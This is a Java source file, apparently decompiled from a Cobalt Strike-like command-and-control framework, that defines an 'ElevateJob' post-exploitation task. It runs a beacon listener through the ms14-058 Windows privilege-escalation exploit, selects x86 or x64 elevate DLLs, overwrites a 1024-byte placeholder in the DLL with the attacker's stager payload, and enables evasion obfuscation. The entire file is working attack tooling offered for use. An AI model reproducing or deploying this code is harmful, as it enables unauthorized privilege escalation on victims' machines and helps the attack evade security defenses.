package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import pe.PostExObfuscator;

public class ElevateJob extends Job {
    protected String commandz;

    protected String listener;

    protected byte[] stager;

    public ElevateJob(TaskBeacon taskBeacon, String string, byte[] arrby) {
        super(taskBeacon);
        this.listener = string;
        this.stager = arrby;
    }

    public String getDescription() {
        return "Tasked beacon to run " + this.listener + " via ms14-058";
    }

    public String getShortDescription() {
        return "elevate";
    }

    public String getDLLName() {
        return this.arch.equals("x64") ? "resources/elevate.x64.dll" : "resources/elevate.dll";
    }

    public String getTactic() {
        return "T1068";
    }

    public String getPipeName() {
        return "elevate";
    }

    public int getCallbackType() {
        return 0;
    }

    public int getWaitTime() {
        return 5000;
    }

    public byte[] fix(byte[] arrby) {
        String str = CommonUtils.bString(arrby);
        int i = str.indexOf(CommonUtils.repeat("A", 1024));
        str = CommonUtils.replaceAt(str, CommonUtils.bString(this.stager), i);
        return CommonUtils.toBytes(str);
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
        postExObfuscator.enableEvasions();
    }
}
